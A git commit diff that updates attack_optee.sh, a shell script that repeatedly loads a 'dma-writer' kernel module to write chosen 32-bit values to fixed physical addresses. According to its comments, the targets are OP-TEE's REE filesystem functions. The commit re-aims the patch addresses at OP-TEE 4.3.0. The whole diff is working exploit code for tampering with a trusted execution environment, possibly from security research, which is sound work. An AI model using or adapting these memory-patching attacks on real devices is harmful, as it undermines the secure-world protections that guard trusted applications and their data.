cc454fc4c60fdf0025a5ee80b96a4cb7ef781b2f
Daniel Padrta <danielpadrta@gmail.com>
2024-10-08 10:14:04 +0200

    Update built files for OP-TEE 4.3.0

--- attack_optee.sh
+++ attack_optee.sh
@@ -1,32 +1,35 @@
 #!/bin/sh
 
 # ree_fs_ta_open
-# 10156c34
-insmod dma-writer.ko addr=269839412 data=3943170335
+# 10156914
+insmod dma-writer.ko addr=269838612 data=3943170335
 # echo Press enter to continue... ; read
 rmmod dma-writer.ko
 
-# 1011687c
-insmod dma-writer.ko addr=269576316 data=3019899007
+# 10116880
+insmod dma-writer.ko addr=269576320 data=3019899007
 # echo Press enter to continue... ; read
 rmmod dma-writer.ko
 
-# 10116888
-insmod dma-writer.ko addr=269576328 data=889202879
+# 1011688c
+insmod dma-writer.ko addr=269576332 data=889202879
 # echo Press enter to continue... ; read
 rmmod dma-writer.ko
 
 # ree_fs_open
-insmod dma-writer.ko addr=269577312 data=3942645791
+# 10116c64
+insmod dma-writer.ko addr=269577316 data=3942645791
 # echo Press enter to continue... ; read
 rmmod dma-writer.ko
 
 # ree_fs_ta_read
-insmod dma-writer.ko addr=269575468 data=889192031
+# 10116530
+insmod dma-writer.ko addr=269575472 data=889192031
 # echo Press enter to continue... ; read
 rmmod dma-writer.ko
 
 # ree_fs_read
-insmod dma-writer.ko addr=269575512 data=905967775
+# 1011655c
+insmod dma-writer.ko addr=269575516 data=905967775
 # echo Press enter to continue... ; read
 rmmod dma-writer.ko
